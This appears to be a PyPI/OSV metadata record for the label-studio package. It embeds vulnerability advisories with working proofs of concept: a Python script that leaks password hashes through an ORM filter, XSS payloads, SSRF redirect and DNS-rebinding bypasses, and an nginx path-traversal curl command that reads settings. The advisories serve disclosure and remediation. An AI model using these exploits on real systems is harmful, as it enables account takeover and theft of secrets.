<2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.2.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.2.post0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (==19.1.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (==0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.28)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.2.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"1143526598fda8b463e991308c544b2130f1e6e25c30172115345000f853c964","md5":"36b7f67ee0546a5e69446db28d401dde","sha256":"376659405db60cde29a9bc8b9290cd52da68283ef5d9bfd93d2c11fa5cb28181"},"downloads":-1,"filename":"label_studio-1.0.2.post0-py3-none-any.whl","has_sig":false,"md5_digest":"36b7f67ee0546a5e69446db28d401dde","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":45946005,"upload_time":"2021-06-14T22:27:38","upload_time_iso_8601":"2021-06-14T22:27:38.256120Z","url":"https://files.pythonhosted.org/packages/11/43/526598fda8b463e991308c544b2130f1e6e25c30172115345000f853c964/label_studio-1.0.2.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"54c8d2134108d3cd15e094fea2fae6ecf543feb26623c844a65f5fdf076dc5d4","md5":"566003e04962eca727becd3381bdb5a5","sha256":"e9abae77020d824b42f294c86cc320a49d4a2bca21e7e10d5fc1748217f78be2"},"downloads":-1,"filename":"label-studio-1.0.2.post0.tar.gz","has_sig":false,"md5_digest":"566003e04962eca727becd3381bdb5a5","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":45481477,"upload_time":"2021-06-14T22:28:03","upload_time_iso_8601":"2021-06-14T22:28:03.933367Z","url":"https://files.pythonhosted.org/packages/54/c8/d2134108d3cd15e094fea2fae6ecf543feb26623c844a65f5fdf076dc5d4/label-studio-1.0.2.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), 